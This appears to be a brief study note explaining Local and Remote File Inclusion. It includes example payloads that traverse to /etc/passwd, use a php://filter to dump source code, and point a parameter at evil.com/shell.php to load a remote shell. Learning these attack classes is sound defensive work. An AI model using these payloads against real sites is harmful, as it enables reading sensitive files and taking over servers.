### **What is Local File Inclusion -- ( LFI ) ?**
-  LFI is a vulnerability where an attacker can **include files from the local server** (the machine hosting the website) **through a vulnerable input.**
- **Use case :** 
	-  To read sensitive files like `/etc/passwd` (Linux)
	- `C:\Windows\win.ini` (Windows).

```shell
# EXAMPLE PAYLOADS 
	- http://example.com/index.php?page=../../../../etc/passwd
	- http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index
```

### **What is Remote File Inclusion -- ( RFI ) ?**
-  You can **include/execute files from ANOTHER SERVER**
- Example: `?file=chocolate_cake.txt` → change to `?file=http://evil.com/shell.php`
- **More dangerous than LFI** - can get full control of server!
